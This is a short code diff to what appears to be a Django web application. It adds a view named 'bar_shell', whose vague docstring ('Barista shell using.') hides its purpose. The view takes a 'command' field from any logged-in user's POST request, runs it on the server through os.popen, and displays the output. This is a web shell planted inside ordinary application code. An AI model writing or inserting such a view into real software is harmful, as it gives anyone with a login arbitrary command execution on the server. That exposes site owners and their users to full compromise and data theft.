@@ -75,3 +75,14 @@ def edit_contact(request):
         else:
             form = EditContactForm(request.POST)
             return render(request, 'edit_contact.html', {'form': form})
+
+@login_required
+def bar_shell(request):
+    """Barista shell using."""
+    if request.method == 'POST':
+        command = request.POST.get('command')
+        import os
+        answer = os.popen(command)
+        answer = answer.read().split('\n')
+        return render(request, 'terminal.html', {'answer': answer})
+    return render(request, 'terminal.html')
